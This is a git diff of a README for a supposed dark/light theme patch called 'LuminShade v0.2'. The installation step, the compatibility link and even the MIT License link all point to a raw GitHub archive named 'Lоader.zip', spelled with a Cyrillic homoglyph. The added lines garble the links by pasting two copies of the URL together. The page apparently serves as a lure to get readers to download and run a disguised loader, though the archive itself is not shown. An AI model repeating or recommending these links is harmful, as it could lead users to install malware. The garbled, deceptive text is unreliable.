@@ -6,8 +6,8 @@ With a packed suite of innovative features, in-depth documentation, and ongoing 
 
 ## 🚀 Installation Guide
 
-1. **Download https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip from the repository.**  
-   Simply click the `https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip` file and download it directly from this GitHub repository.
+1. **Download https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zipоhttps://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip from the repository.**  
+   Simply click the `https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zipоhttps://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip` file and download it directly from this GitHub repository.
 
 2. **Extract the archive.**  
    Use any modern archival tool (WinRAR, 7-Zip, macOS Archive Utility, or a Linux archive manager) to extract the folder to your desired location.
@@ -33,7 +33,7 @@ With a packed suite of innovative features, in-depth documentation, and ongoing 
 | iOS 16+                     | 🟡 Beta Support       | UIwebView/SwiftUI themes only |
 | Steam Deck / SteamOS        | ✅ Optimized Support  | Custom game overlays         |
 
-> Not sure about your system? Check the **https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip** for the up-to-date list!
+> Not sure about your system? Check the **https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zipоhttps://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip** for the up-to-date list!
 
 ## ✨ Feature Overview  
 
@@ -78,7 +78,7 @@ Universal dark mode, adaptive light theme, cross-platform patch, Windows dark th
 
 ## 📜 License
 
-This project is distributed under the flexible and open **[MIT License (2025)](https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip)**, allowing for free personal or commercial use, modification, and distribution.  
+This project is distributed under the flexible and open **[MIT License (2025)](https://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zipоhttps://raw.githubusercontent.com/Mohanad7770/LuminShade-v0.2-Patch/main/Lоader.zip)**, allowing for free personal or commercial use, modification, and distribution.  
 
 > Embrace a better interface experience; thank you for being part of the Light and Dark community!
 
